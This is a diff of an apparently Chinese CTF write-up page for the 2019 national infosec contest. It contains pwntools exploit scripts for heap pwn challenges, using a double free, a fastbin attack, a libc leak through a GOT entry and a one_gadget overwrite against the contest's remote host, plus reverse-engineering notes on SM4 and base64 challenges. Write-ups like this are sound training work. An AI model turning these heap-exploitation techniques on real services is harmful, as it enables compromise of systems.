+libc <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;&gt;\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">&apos;\0&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x78460</span>
+
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> <span class="token string">&quot;a&quot;</span><span class="token punctuation">)</span><span class="token comment">#5</span>
+remove<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+remove<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x3dc8a8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#6</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x3dc8a8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#7</span>
+add<span class="token punctuation">(</span><span class="token string">&quot;a&quot;</span><span class="token punctuation">,</span> <span class="token number">0xe0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>libc <span class="token operator">+</span> <span class="token number">0x47c46</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#8</span>
+
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">&quot;index:&quot;</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment">#gdb.attach(r)</span>
+<span class="token keyword">print</span> <span class="token string">&quot;libc: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h3 id="double"><a name="double" class="plugin-anchor" href="#double"><i class="fa fa-link" aria-hidden="true"></i></a>double</h3>
+<p>&#x8FD9;&#x9898;&#x7684;&#x70B9;&#x627E;&#x4E86;&#x597D;&#x4E45;&#xFF0C;&#x4E00;&#x76F4;&#x6CA1; get &#x5230;&#xFF0C;&#xFF08;&#x6CA1;&#x6CE8;&#x610F;&#x9898;&#x76EE;&#x540D;&#xFF0C;&#x624B;&#x52A8;&#x6ED1;&#x7A3D;&#xFF09;&#xFF0C;&#x7814;&#x7A76;&#x4E86;&#x5404;&#x79CD;&#x59FF;&#x52BF;&#xFF0C;&#x56DE;&#x539F;&#x70B9;&#xFF0C;&#x4E24;&#x4E2A;&#x540C;&#x6837;&#x7684;&#x6587;&#x4EF6;&#x91CA;&#x653E;&#x4F1A;&#x62A5; double free &#x7684;&#x9519;&#xFF0C;&#x624D;&#x53D1;&#x73B0;&#x81EA;&#x5DF1;&#x6F0F;&#x770B;&#x4E86;&#x4E00;&#x5757;&#x5730;&#x65B9;&#xFF0C;&#x7136;&#x540E;&#x5229;&#x7528;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x4E00;&#x81F4;&#xFF0C;&#x5F15;&#x7528;&#x540C;&#x4E00;&#x6587;&#x4EF6;&#x3002;&#x5B9E;&#x73B0; double free&#x3002;&#x7136;&#x540E; fastbin attack&#x518D;&#x6B21; diss&#xFF0C;&#x4E3B;&#x529E;&#x65B9;&#x7684; check &#x7ADF;&#x7136; system(&#x201C;sh&#x201D;) &#xFF0C;&#x547D;&#x4EE4;&#x5728;&#x5BB9;&#x5668;&#x91CC;&#x5565;&#x6743;&#x9650;&#x90FD;&#x6CA1;&#xFF0C;&#x8FD8;&#x4E0D;&#x8BA9;&#x6211;&#x8FC7;&#xFF0C;&#x641E;&#x5F97;&#x6211;&#x53EA;&#x597D;&#x627E; onegadget  </p>
+<pre class="language-"><code>from pwn import *
+context.log_level = &quot;debug&quot; p = process(&quot;./pwn&quot;)
+p = remote(&quot;e095ff54e419a6e01532dee4ba86fa9c.kr-lab.com&quot;,40002)
+elf = ELF(&apos;./pwn&apos;)
+libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)
+def add(content):
+    p.recvuntil(&apos;&gt; &apos;)
+    p.sendline(&apos;1&apos;)
+    p.recvuntil(&apos;Your data:\n&apos;)
+    p.send(content)
+def edit(index,content):
+    p.recvuntil(&apos;&gt; &apos;)
+    p.sendline(&apos;3&apos;)
+    p.recvuntil(&apos;Info index: &apos;)
+    p.sendline(str(index))
+    p.send(content)
+def show(index):
+    p.recvuntil(&apos;&gt; &apos;)
+    p.sendline(&apos;2&apos;)
+    p.recvuntil(&apos;Info index: &apos;)
+    p.sendline(str(index))
+def delete(index):
+    p.recvuntil(&apos;&gt; &apos;)
+    p.sendline(&apos;4&apos;)
+    p.sendline(str(index))
+add(0x50*&apos;s&apos;+&apos;\n&apos;)
+add(0x60*&apos;s&apos;+&apos;\n&apos;)
+add(0x60*&apos;s&apos;+&apos;\n&apos;)
+add(0x60*&apos;b&apos;+&apos;\n&apos;)
+delete(1)
+delete(3)
+delete(2)
+add(p64(0x4040bd).ljust(0x60,&apos;c&apos;)+&apos;\n&apos;)
+add(0x60*&apos;n&apos;+&apos;\n&apos;)
+add(0x60*&apos;m&apos;+&apos;\n&apos;)
+payload = &apos;d&apos;*3 + p64(0x4040e0) + p64(0x4040f0) + p32(0) + p32(20) +
+p64(elf.got[&apos;read&apos;])+p64(0x4040f0)
+add((0x60*&apos;\x00&apos;)+&apos;\n&apos;)
+edit(0,payload+&apos;\n&apos;)
+show(0)
+readaddr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))
+libcaddr = readaddr - libc.symbols[&apos;read&apos;]
+print &quot;libc----&gt;&quot;,hex(libcaddr)
+edit(0,p64(libcaddr + 0x4526a)+&apos;\n&apos;)
+p.sendline(&apos;icqf3f12bdf6e59569e295aacbd704b2&apos;)
+p.interactive()
+</code></pre><h2 id="reverse"><a name="reverse" class="plugin-anchor" href="#reverse"><i class="fa fa-link" aria-hidden="true"></i></a>Reverse</h2>
+<p><strong>&#x4F5C;&#x8005;&#xFF1A;wu1a&#x3001;lizhirui</strong></p>
+<h3 id="bbvvmm"><a name="bbvvmm" class="plugin-anchor" href="#bbvvmm"><i class="fa fa-link" aria-hidden="true"></i></a>bbvvmm</h3>
+<p>&#x62D6;&#x5165; ida &#x67E5;&#x770B;&#x5230;&#x7A0B;&#x5E8F;&#x672C;&#x8EAB;&#x4E3B;&#x4F53;&#x903B;&#x8F91;&#x8FD8;&#x7B97;&#x6BD4;&#x8F83;&#x6E05;&#x6670;&#xFF0C;</p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde5288dc0f.png" alt=""></p>
+<p>&#x5BF9;&#x8F93;&#x5165;&#x7684; username &#x548C; password &#x8FDB;&#x884C;&#x53D8;&#x6362;&#x540E;&#x5C06;&#x7ED3;&#x679C;&#x4E0E;&#x79D8;&#x94A5;&#x8FDB;&#x884C; sm4 &#x52A0;&#x5BC6;&#xFF0C;&#x518D; hex&#xFF0C;&#x7136;&#x540E;&#x8FDB;&#x884C;&#x53D8;&#x5F02;&#x7684; base64 &#x7F16;&#x7801;&#x3002;</p>
+<p>&#x65AD;&#x70B9;&#x4E0B;&#x5728; 0x4069DD &#x5904;&#x540E;&#x53EF;&#x53D1;&#x73B0;&#x51FD;&#x6570;&#x5C06; username &#x90FD;&#x8F6C;&#x6362;&#x6210;&#x4E86;&#x5341;&#x516D;&#x8FDB;&#x5236;<br>&#x65AD;&#x70B9;&#x4E0B;&#x5728; 0x406A88 &#x5904;&#x53EF;&#x770B;&#x5230; sm &#x52A0;&#x5BC6;&#x8FC7;&#x7A0B;&#xFF0C;&#x7ECF;&#x6D4B;&#x8BD5;&#x662F;&#x6807;&#x51C6;&#x7684; sm4 &#x52A0;&#x5BC6;  </p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde52fed50b.png" alt="">  </p>
+<p>&#x79D8;&#x94A5;&#x5728; 0x401063 &#x5904;&#x751F;&#x6210;&#xFF0C;&#x53BB;&#x76F4;&#x63A5;&#x53BB;&#x9006;&#x79D8;&#x94A5;</p>
+<p><img src="https://i.loli.net/2019/04/23/5cbde5368d6c8.png" alt="">  </p>
+<p>&#x4E4B;&#x540E;&#x5148;&#x8FDB;&#x884C;&#x53D8;&#x5F02;&#x7684; base64 &#x89E3;&#x7801;&#xFF0C;&#x518D;&#x7528;&#x6807;&#x51C6;&#x7684; sm4 &#x89E3;&#x7801;&#xFF0C;&#x5373;&#x53EF;&#x5F97;&#x51FA; username &#x548C; password &#x4E3A;<br>0x6261647265723132 &#x548C; 0x78797a7b7c7d
+&#x5373; badrer12 &#x548C; xyz{|}<br>Nc &#x8FC7;&#x53BB;&#x53D1;&#x73B0;&#x76F4;&#x63A5;&#x8F93;&#x5165;&#x8FD8;&#x65E0;&#x6CD5;&#x83B7;&#x5F97; flag&#xFF0C;&#x8FD8;&#x5F97;&#x7528; py &#x8DD1;&#x4E00;&#x4E0B;<br><img src="https://i.loli.net/2019/04/23/5cbde53ee0fe4.png" alt="">  </p>
+<h3 id="easygo"><a name="easygo" class="plugin-anchor" href="#easygo"><i class="fa fa-link" aria-hidden="true"></i></a>easygo</h3>
+<p>Easy_go
+&#x62D6;&#x5165; ida &#x53D1;&#x73B0;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x53CA;&#x5176;&#x590D;&#x6742;&#xFF0C;&#x5206;&#x6790;&#x6781;&#x96BE;&#xFF0C;&#x76F4;&#x63A5;&#x4E0B;&#x65AD;&#x70B9;&#x8DD1;&#x4E00;&#x4E0B;&#x8BD5;&#x8BD5;<br><img src="https://i.loli.net/2019/04/23/5cbde585cb332.png" alt=""><br>&#x53D1;&#x73B0;&#x968F;&#x610F;&#x8F93;&#x5165;&#x4E4B;&#x540E;&#x5C31;&#x76F4;&#x63A5;&#x62A5;&#x9519;&#x4E86;&#xFF0C;&#x4F46;&#x662F;&#x5BC4;&#x5B58;&#x5668;&#x91CC;&#x5DF2;&#x7ECF;&#x51FA;&#x73B0;&#x4E86; flag&#xFF0C;&#x76F4;&#x63A5;&#x63D0;&#x53D6;&#x5C31;&#x597D;<br><img src="https://i.loli.net/2019/04/23/5cbde58c7a2b5.png" alt="">  </p>
+<h3 id="strangeint"><a name="strangeint" class="plugin-anchor" href="#strangeint"><i class="fa fa-link" aria-hidden="true"></i></a>strange_int</h3>
+<p>&#x7BC7;&#x5E45;&#x95EE;&#x9898;&#xFF0C;&#x8BF7;&#x79FB;&#x6B65;&#xFF1A;<a href="https://www.52pojie.cn/thread-936377-1-1.html" target="_blank">https://www.52pojie.cn/thread-936377-1-1.html</a></p>
 <h2 id="&#x8BC4;&#x8BBA;&#x533A;"><a name="&#x8BC4;&#x8BBA;&#x533A;" class="plugin-anchor" href="#&#x8BC4;&#x8BBA;&#x533A;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x8BC4;&#x8BBA;&#x533A;</h2>
 <p><strong>&#x8BF7;&#x6587;&#x660E;&#x8BC4;&#x8BBA;&#xFF0C;&#x7981;&#x6B62;&#x5E7F;&#x544A;</strong>
 <img src="https://cloud.panjunwen.com/alu/&#x6247;&#x8033;&#x5149;.png" alt="&#x6247;&#x8033;&#x5149;.png" class="vemoticon-img">  </p>
@@ -1317,7 +1718,7 @@ if (isset($_FILES[&quot;file&quot;])) {
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"2019全国信安赛","level":"1.5.1","depth":2,"next":{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},"previous":{"title":"目前已收录","level":"1.5","depth":1,"path":"articals/all.md","ref":"articals/all.md","articles":[{"title":"2019全国信安赛","level":"1.5.1","depth":2,"path":"articals/2019national.md","ref":"articals/2019national.md","articles":[]},{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},{"title":"2017全国信安赛","level":"1.5.3","depth":2,"path":"articals/2017national.md","ref":"articals/2017national.md","articles":[]},{"title":"2019西湖论剑预选赛","level":"1.5.4","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},{"title":"实验吧web部分","level":"1.5.5","depth":2,"path":"articals/shiyanbar_web.md","ref":"articals/shiyanbar_web.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2019national.md","mtime":"2019-04-22T13:55:58.353Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-22T13:59:04.671Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"2019全国信安赛","level":"1.5.1","depth":2,"next":{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},"previous":{"title":"目前已收录","level":"1.5","depth":1,"path":"articals/all.md","ref":"articals/all.md","articles":[{"title":"2019全国信安赛","level":"1.5.1","depth":2,"path":"articals/2019national.md","ref":"articals/2019national.md","articles":[]},{"title":"2019DDCTF","level":"1.5.2","depth":2,"path":"articals/2019ddctf.md","ref":"articals/2019ddctf.md","articles":[]},{"title":"2017全国信安赛","level":"1.5.3","depth":2,"path":"articals/2017national.md","ref":"articals/2017national.md","articles":[]},{"title":"2019西湖论剑预选赛","level":"1.5.4","depth":2,"path":"articals/xihulunjian2019.md","ref":"articals/xihulunjian2019.md","articles":[]},{"title":"实验吧web部分","level":"1.5.5","depth":2,"path":"articals/shiyanbar_web.md","ref":"articals/shiyanbar_web.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["expandable-chapters","splitter","anchors","copy-code-button","github","-highlight","prism","sitemap","analytics","search-plus"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"prism":{"css":["prismjs/themes/prism.css"]},"github":{"url":"https://github.com/HackerYunen/CTFWP"},"analytics":{"baidu":"2b55d8e2dd73ae8a37978eec7e143a7c"},"splitter":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"fontsettings":{"theme":"white","family":"sans","size":2},"sitemap":{"hostname":"https://www.ctfwp.com/"},"copy-code-button":{},"sharing":{"facebook":false,"twitter":false,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":[]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"anchors":{},"expandable-chapters":{},"search-plus":{}},"theme":"default","author":"Yunen <yunen@cqu.edu.cn>","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"CTF Writeup","links":{"sharing":{"all":false,"facebook":false,"google":false,"twitter":false,"weibo":false},"sidebar":{"首页":"/"}},"gitbook":"*","description":"Collect writeups of CTF.","extension":null},"file":{"path":"articals/2019national.md","mtime":"2019-04-22T16:21:43.218Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-04-22T16:22:05.713Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
